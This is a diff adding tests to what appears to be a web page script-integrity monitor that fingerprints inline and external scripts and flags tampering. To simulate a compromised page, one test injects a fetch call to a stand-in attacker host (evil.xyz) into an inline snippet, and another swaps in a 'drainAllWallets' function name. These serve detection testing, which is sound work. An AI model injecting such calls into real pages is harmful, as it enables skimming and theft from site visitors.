@@ -101,3 +101,40 @@ describe("fingerprint and compare", () => {
     expect(parseFingerprint('{"v":1,"scripts":{},"flags":[]}')).not.toBeNull();
   });
 });
+
+describe("real-world noise vs real changes", () => {
+  const cf = (r: string, t: string) =>
+    `<html><script>(function(){var d=document.createElement('script');d.innerHTML="window.__CF$cv$params={r:'${r}',t:'${t}'};";document.head.appendChild(d)})();</script></html>`;
+
+  it("ignores per-request tokens inside an inline snippet", async () => {
+    const a = await fingerprintPage(cf("a582b9cb293f45c8", "MTc5NDI4MDgyMy4wMDAwMDA="), BASE, fetcher());
+    const b = await fingerprintPage(cf("a582b9cc8ce045c8", "MTc5NDI4MDgyNC4wMDAwMDA="), BASE, fetcher());
+    expect(compareFingerprint(a, b).verdict).toBe("match");
+  });
+
+  it("still catches a change to the inline code itself", async () => {
+    const a = await fingerprintPage(cf("a582b9cb293f45c8", "MTc5NDI4MDgyMy4wMDAwMDA="), BASE, fetcher());
+    const evil = cf("a582b9cb293f45c8", "MTc5NDI4MDgyMy4wMDAwMDA=").replace("document.head.appendChild(d)", "document.head.appendChild(d);fetch('https://evil.xyz/x')");
+    const b = await fingerprintPage(evil, BASE, fetcher());
+    const c = compareFingerprint(a, b);
+    expect(c.verdict).toBe("mismatch");
+    expect(decideStatus(c, b).status).toBe("Compromised");
+  });
+
+  it("does not fingerprint JSON data blocks, but does fingerprint module and plain scripts", () => {
+    const html = `<script id="__NEXT_DATA__" type="application/json">{"a":1}</script><script type="application/ld+json">{}</script><script type="module" src="/m.js"></script><script>run()</script>`;
+    const { scripts } = extractScripts(html, BASE);
+    expect(scripts.map((s) => s.src ?? "inline")).toEqual(["https://app.protocol.fi/m.js", "inline"]);
+  });
+});
+
+describe("short volatile tokens", () => {
+  it("ignores a short base64 timestamp but keeps ordinary identifiers meaningful", async () => {
+    const mk = (t: string, fn: string) => `<script>var x={t:'${t}'};document.createElement('script');${fn}();</script>`;
+    const a = await fingerprintPage(mk("MTc5NDI4OTQ1OA==", "go"), BASE, fetcher());
+    const b = await fingerprintPage(mk("MTc5NDI4OTQ1OQ==", "go"), BASE, fetcher());
+    expect(compareFingerprint(a, b).verdict).toBe("match");
+    const c = await fingerprintPage(mk("MTc5NDI4OTQ1OQ==", "drainAllWallets"), BASE, fetcher());
+    expect(compareFingerprint(a, c).verdict).toBe("mismatch");
+  });
+});
